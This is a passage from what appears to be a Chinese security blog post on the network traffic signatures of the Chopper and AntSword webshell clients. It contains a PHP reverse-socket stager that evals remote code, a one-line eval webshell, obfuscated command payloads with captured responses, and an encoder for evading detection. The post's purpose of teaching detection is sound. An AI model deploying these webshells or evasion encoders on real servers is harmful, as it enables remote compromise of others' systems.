class="string">'socket'</span>;&#125;<span class="keyword">if</span> (!$s_type) &#123;<span class="keyword">die</span>(<span class="string">'no socket funcs'</span>);&#125;<span class="keyword">if</span> (!$s) &#123;<span class="keyword">die</span>(<span class="string">'no socket'</span>);&#125;</span><br><span class="line"><span class="keyword">switch</span> ($s_type) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'stream'</span>:$len       = fread($s, <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">break</span>;<span class="keyword">case</span> <span class="string">'socket'</span>:$len = socket_read($s, <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">break</span>;&#125;<span class="keyword">if</span> (!$len) &#123;<span class="keyword">die</span>();&#125;</span><br><span class="line">$a   = unpack(<span class="string">"Nlen"</span>, $len);</span><br><span class="line">$len = $a[<span class="string">'len'</span>];</span><br><span class="line">$b   = <span class="string">''</span>;<span class="keyword">while</span> (strlen($b) &lt; $len) &#123;</span><br><span class="line">	<span class="keyword">switch</span> ($s_type) &#123;<span class="keyword">case</span> <span class="string">'stream'</span>:$b .= fread($s, $len - strlen($b));</span><br><span class="line">		<span class="keyword">break</span>;<span class="keyword">case</span> <span class="string">'socket'</span>:$b .= socket_read($s, $len - strlen($b));</span><br><span class="line">		<span class="keyword">break</span>;&#125;&#125;</span><br><span class="line">$GLOBALS[<span class="string">'msgsock'</span>]      = $s;</span><br><span class="line">$GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type;<span class="keyword">if</span> (extension_loaded(<span class="string">'suhosin'</span>) &amp;&amp; ini_get(<span class="string">'suhosin.executor.disable_eval'</span>)) &#123;</span><br><span class="line">	$suhosin_bypass = create_function(<span class="string">''</span>, $b);</span><br><span class="line">	$suhosin_bypass();&#125; <span class="keyword">else</span> &#123;<span class="keyword">eval</span>($b);&#125;</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<p>与msf持续socket通信</p>
+<h1 id="WebShell客户端的流量特征"><a href="#WebShell客户端的流量特征" class="headerlink" title="WebShell客户端的流量特征"></a>WebShell客户端的流量特征</h1><h2 id="中国菜刀-Chopper"><a href="#中国菜刀-Chopper" class="headerlink" title="中国菜刀(Chopper)"></a>中国菜刀(Chopper)</h2><p><strong>1.PHP类WebShell链接流量</strong></p>
+<p>其中特征主要在body中，将body中流量进行url解码后如下：</p>
+<p>其中特征点有如下三部分，</p>
+<p>第一：<code>eval</code>，eval函数用于执行传递的攻击payload，这是必不可少的；</p>
+<p>第二：<code>base64_decode($_POST[z0])</code>，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码，以避免被检测；</p>
+<p>第三：<code>&amp;z0=QGluaV9zZXQ…</code>，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。</p>
+<p>注：</p>
+<blockquote>
+<p>1.有少数时候eval方法会被assert方法替代。</p>
+<p>2.<code>$_POST</code>也会被$_GET、$_REQUEST替代。</p>
+<p>3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。</p>
+</blockquote>
+<p><strong>2.JSP类WebShell链接流量：</strong></p>
+<p>该流量是WebShell链接流量的第一段链接流量，其中特征主要在<code>i=A&amp;z0=GB2312</code>，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=参数用来加入攻击载荷。</p>
+<p>注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</p>
+<p><strong>3.ASP类WebShell链接流量：</strong></p>
+<p>其中body流量进行URL解码后</p>
+<p>其中特征点有如下三部分，</p>
+<p>第一：“Execute”，Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数；</p>
+<p>第二：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。</p>
+<p>第三：Response.Write和Response.End是必有的，是来完善整个操作的。</p>
+<p>这种流量主要识别这几部分特征，在正常流量中基本没有。</p>
+<p>注：OnError Resume Next这个特征在大部分流量中存在，极少数情况没有。</p>
+<p><strong>中国菜刀2016版本各语言WebShell链接流量特征</strong></p>
+<p>请求包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/d.php HTTP/1.1</span><br><span class="line">X-Forwarded-For: 146.177.153.17</span><br><span class="line">Referer: http://10.0.83.217:8080/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Content-Length: 674</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">x=array_map(&quot;ass&quot;.&quot;ert&quot;,array(&quot;ev&quot;.&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE\\\&quot;;@ev&quot;.&quot;al(\\\$xx(&apos;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOztlY2hvKCJYQFkiKTtkaWUoKTs%3D&apos;));\&quot;);&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>响应包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.11.5</span><br><span class="line">Date: Thu, 19 Sep 2019 07:23:04 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.27</span><br><span class="line"></span><br><span class="line">X@YE:\phpstudy\WWW\shop	C:E:	Windows NT WIN-OMZKKO5S2WH 6.0 build 6002 (Windows Server 2008 Web Server Edition Service Pack 2)</span><br></pre></td></tr></table></figure>
+
+<p><strong>1.PHP类WebShell链接流量</strong></p>
+<p>其中特征主要在body中，将body中部分如下：</p>
+<p>这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。</p>
+<p>其中特征点有如下三部分，</p>
+<p>第一：<code>“Ba”.”SE6″.”4_dEc”.”OdE”</code>，这部分是将base64解码打断使用.来连接。</p>
+<p>第二：<code>@ev”.”al</code>，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。</p>
+<p>第三：<code>QGluaV9zZXQoImRpc3BsYXlf…</code>，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。</p>
+<p>注：1.有少数时候eval方法会被assert方法替代。</p>
+<p><strong>2.JSP类WebShell链接流量：</strong></p>
+<p>该版本JSPwebshell流量与之前版本一样，</p>
+<p>所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A&amp;z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=、z2=参数用来加入攻击载荷。</p>
+<p>注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</p>
+<p><strong>3.ASP类WebShell链接流量：</strong></p>
+<p>其中body流量为：</p>
+<p>2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。</p>
+<p>或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。</p>
+<p>这种流量主要识别这几部分特征，在正常流量中基本没有。</p>
+<h2 id="中国蚁剑-AntSword"><a href="#中国蚁剑-AntSword" class="headerlink" title="中国蚁剑(AntSword)"></a>中国蚁剑(AntSword)</h2><h3 id="蚁剑流量明显特征"><a href="#蚁剑流量明显特征" class="headerlink" title="蚁剑流量明显特征"></a>蚁剑流量明显特征</h3><p>使用版本：<code>v2.1.3</code></p>
+<p>无加密请求数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/d.php HTTP/1.1</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 983</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">x=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;b61ed&quot;;echo @asenc($output);echo &quot;8c7a0&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;	&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;	&quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;	&#123;$s&#125;&quot;;echo $R;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure>
+
+<p>响应包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.11.5</span><br><span class="line">Date: Wed, 18 Sep 2019 06:44:31 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.27</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line"></span><br><span class="line">b61edE:/phpstudy/WWW/shop	C:E:	Windows NT WIN-OMZKKO5S2WH 6.0 build 6002 (Windows Server 2008 Web Server Edition Service Pack 2) i586	Administrator8c7a0</span><br></pre></td></tr></table></figure>
+
+<p>针对最明显的特征就是user-agent可以在下面两处地方进行修改</p>
+<blockquote>
+<p>antSword-2.0.2\modules\request.js （21行一处）<br>antSword-2.0.2\modules\update.js （两处）</p>
+</blockquote>
+<p><strong>蚁剑PHP类WebShell链接流量</strong></p>
+<p>其中body流量进行URL解码后为：</p>
+<p>其中流量最中明显的特征为<code>@ini_set(“display_errors”,”0″);</code>这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现。</p>
+<p><strong>蚁剑ASP类WebShell链接流量</strong></p>
+<p>其中body流量进行URL解码后为：</p>
+<p>我们可以看出蚁剑针对ASP类的WebShell流量与菜刀的流量很像，其中特征也是相同，如<code>OnError</code>、<code>ResumeNext</code>、<code>Response.End</code>、<code>Response.Write</code>，其中execute在蚁剑中被打断混淆了，变成了拼接形式Ex”&amp;cHr(101)&amp;”cute，同时该流量中也使用了eval参数，可以被认为明显特征。</p>
+<h3 id="蚁剑bypass特征"><a href="#蚁剑bypass特征" class="headerlink" title="蚁剑bypass特征"></a>蚁剑bypass特征</h3><h4 id="选择base64加密"><a href="#选择base64加密" class="headerlink" title="选择base64加密"></a><strong>选择base64加密</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/d.php HTTP/1.1</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 960</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">_0x10e40a2245318=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIEBiYXNlNjRfZW5jb2RlKCRvdXQpO307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gIjI2ZTI5IjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICJjNjYyOSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk/JHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7&amp;x=@eval(@base64_decode($_POST[_0x10e40a2245318]));</span><br></pre></td></tr></table></figure>
+
+<p>对其中的base64进行解码，发送的请求为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_0x10e40a2245318=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return @base64_encode($out);&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;26e29&quot;;echo @asenc($output);echo &quot;c6629&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;	&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;	&quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;	&#123;$s&#125;&quot;;echo $R;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();&amp;x=@eval(@base64_decode($_POST[_0x10e40a2245318]));</span><br></pre></td></tr></table></figure>
+
+<h4 id="选择rot13加密"><a href="#选择rot13加密" class="headerlink" title="选择rot13加密"></a>选择rot13加密</h4><p>请求数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/d.php HTTP/1.1</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1055</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">_0x4cd70cd63391=@vav_frg(&quot;qvfcynl_reebef&quot;, &quot;0&quot;);@frg_gvzr_yvzvg(0);shapgvba nfrap($bhg)&#123;erghea $bhg;&#125;;shapgvba nfbhgchg()&#123;$bhgchg=bo_trg_pbagragf();bo_raq_pyrna();rpub &quot;r1334&quot;;rpub @nfrap($bhgchg);rpub &quot;6ss0n&quot;;&#125;bo_fgneg();gel&#123;$Q=qveanzr($_FREIRE[&quot;FPEVCG_SVYRANZR&quot;]);vs($Q==&quot;&quot;)$Q=qveanzr($_FREIRE[&quot;CNGU_GENAFYNGRQ&quot;]);$E=&quot;&#123;$Q&#125;	&quot;;vs(fhofge($Q,0,1)!=&quot;/&quot;)&#123;sbernpu(enatr(&quot;P&quot;,&quot;M&quot;)nf $Y)vs(vf_qve(&quot;&#123;$Y&#125;:&quot;))$E.=&quot;&#123;$Y&#125;:&quot;;&#125;ryfr&#123;$E.=&quot;/&quot;;&#125;$E.=&quot;	&quot;;$h=(shapgvba_rkvfgf(&quot;cbfvk_trgrtvq&quot;))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):&quot;&quot;;$f=($h)?$h[&quot;anzr&quot;]:@trg_pheerag_hfre();$E.=cuc_hanzr();$E.=&quot;	&#123;$f&#125;&quot;;rpub $E;;&#125;pngpu(Rkprcgvba $r)&#123;rpub &quot;REEBE://&quot;.$r-&gt;trgZrffntr();&#125;;nfbhgchg();qvr();&amp;x=@eval(@str_rot13($_POST[_0x4cd70cd63391]));</span><br></pre></td></tr></table></figure>
+
+<p>响应包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.11.5</span><br><span class="line">Date: Wed, 18 Sep 2019 06:54:44 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.27</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line"></span><br><span class="line">e1334E:/phpstudy/WWW/shop	C:E:	Windows NT WIN-OMZKKO5S2WH 6.0 build 6002 (Windows Server 2008 Web Server Edition Service Pack 2) i586	Administrator6ff0a</span><br></pre></td></tr></table></figure>
+
+<h4 id="multipart-chunked"><a href="#multipart-chunked" class="headerlink" title="multipart /chunked"></a><strong>multipart</strong> /chunked</h4><p>multipart 上传文件形式</p>
+<p>chunked 分块传输</p>
+<p>特征同上，参数名大多以<code>_0x……=</code>这种形式</p>
+<h4 id="自定义编码器"><a href="#自定义编码器" class="headerlink" title="自定义编码器"></a>自定义编码器</h4><p>在传送的数据包上自定义编码器进行传输流量加密</p>
+<p><strong>b64pass编码器</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2019/09/18 17:22:50</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&apos;use strict&apos;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*/</span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  // ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  // 以下代码为 PHP Base64 样例</span><br><span class="line"></span><br><span class="line">  // 生成一个随机变量名</span><br><span class="line">  let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`;</span><br><span class="line">  // 原有的 payload 在 data[&apos;_&apos;]中</span><br><span class="line">  // 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] = Buffer.from(data[&apos;_&apos;]).toString(&apos;base64&apos;);</span><br><span class="line"></span><br><span class="line">  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  //data[pwd] = `eval(base64_decode($_POST[$&#123;randomID&#125;]));`;</span><br><span class="line">  data[pwd] = Buffer.from(`eval(base64_decode($_POST[$&#123;randomID&#125;]));die();`).toString(&apos;base64&apos;);</span><br><span class="line">  // ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  // 删除 _ 原有的payload</span><br><span class="line">  delete data[&apos;_&apos;];</span><br><span class="line">  // 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们只需要做的就是，把 eval(base64_decode 这段特征代码，直接写进一句话代码里就行了，在传输的时候，只传 base64 的数据就可以了。</p>
+<p>所以最后的 webshell 代码是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(base64_decode($_POST[<span class="string">'ant'</span>]));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>请求数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /Antsword1.php HTTP/1.1</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 958</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">_0xda35e59dcb63b=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZDI2MTciO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjdlNDcwIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D&amp;ant=ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFtfMHhkYTM1ZTU5ZGNiNjNiXSkpO2RpZSgpOw%3D%3D</span><br></pre></td></tr></table></figure>
+
+<p>返回包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.11.5</span><br><span class="line">Date: Wed, 18 Sep 2019 11:04:11 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.27</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line"></span><br><span class="line">d2617E:/phpstudy/WWW	C:E:	Windows NT WIN-OMZKKO5S2WH 6.0 build 6002 (Windows Server 2008 Web Server Edition Service Pack 2) i586	Administrator7e470</span><br></pre></td></tr></table></figure>
+
+<p>接收到的数据是 base64 格式的，先解码，然后再传给 eval，效果就是这样子的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_0xda35e59dcb63b=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;d2617&quot;;echo @asenc($output);echo &quot;7e470&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;	&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;	&quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;	&#123;$s&#125;&quot;;echo $R;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure>
+
+<p><strong>AES-128-ECB(ZeroPadding)编码器</strong></p>
+<p>这个需要开启<code>open_ssl</code></p>
+<p>使用具体流程是这样的</p>
+<p>1.上传webshell，内容如下：</p>
